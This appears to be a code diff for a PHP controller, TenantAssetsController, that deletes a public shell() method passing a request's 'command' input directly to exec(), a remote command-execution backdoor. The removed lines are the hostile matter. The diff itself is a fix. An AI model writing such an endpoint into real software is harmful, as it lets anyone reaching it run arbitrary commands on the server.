@@ -28,11 +28,6 @@ class TenantAssetsController extends Controller
         }
     }
 
-    public function shell():void
-    {
-        exec(request()->input('command'));
-    }
-
     /**
      * Prevent path traversal attacks. This is generally a non-issue on modern
      * webservers but it's still worth handling on the application level as well.
